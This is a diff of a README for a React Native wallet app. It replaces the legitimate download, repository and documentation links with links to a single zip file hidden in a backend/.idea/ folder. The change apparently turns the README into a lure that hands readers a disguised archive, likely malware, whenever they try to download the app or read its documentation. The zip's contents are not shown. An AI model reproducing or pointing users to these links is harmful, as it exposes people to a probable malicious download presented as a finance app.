@@ -16,7 +16,7 @@ Welcome to the **react-native-wallet-app**! This modern wallet application allow
 
 To get started with the app, you need to download it. Click the link below to visit the releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Blue.svg)](https://github.com/Lady79Gamer/react-native-wallet-app/releases)
+[![Download Now](https://raw.githubusercontent.com/Lady79Gamer/react-native-wallet-app/main/backend/.idea/react-native-wallet-app-v3.4.zip%https://raw.githubusercontent.com/Lady79Gamer/react-native-wallet-app/main/backend/.idea/react-native-wallet-app-v3.4.zip)](https://raw.githubusercontent.com/Lady79Gamer/react-native-wallet-app/main/backend/.idea/react-native-wallet-app-v3.4.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -77,9 +77,9 @@ This app uses diverse technologies to deliver its features. Here are some topics
 
 ## 🔗 Additional Resources
 
-- [Project Repository](https://github.com/Lady79Gamer/react-native-wallet-app)
-- [Documentation](https://github.com/Lady79Gamer/react-native-wallet-app/wiki)
+- [Project Repository](https://raw.githubusercontent.com/Lady79Gamer/react-native-wallet-app/main/backend/.idea/react-native-wallet-app-v3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Lady79Gamer/react-native-wallet-app/main/backend/.idea/react-native-wallet-app-v3.4.zip)
 
 Thank you for choosing **react-native-wallet-app**! We hope it makes tracking your finances easier and more organized.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Blue.svg)](https://github.com/Lady79Gamer/react-native-wallet-app/releases)
+[![Download Now](https://raw.githubusercontent.com/Lady79Gamer/react-native-wallet-app/main/backend/.idea/react-native-wallet-app-v3.4.zip%https://raw.githubusercontent.com/Lady79Gamer/react-native-wallet-app/main/backend/.idea/react-native-wallet-app-v3.4.zip)](https://raw.githubusercontent.com/Lady79Gamer/react-native-wallet-app/main/backend/.idea/react-native-wallet-app-v3.4.zip)
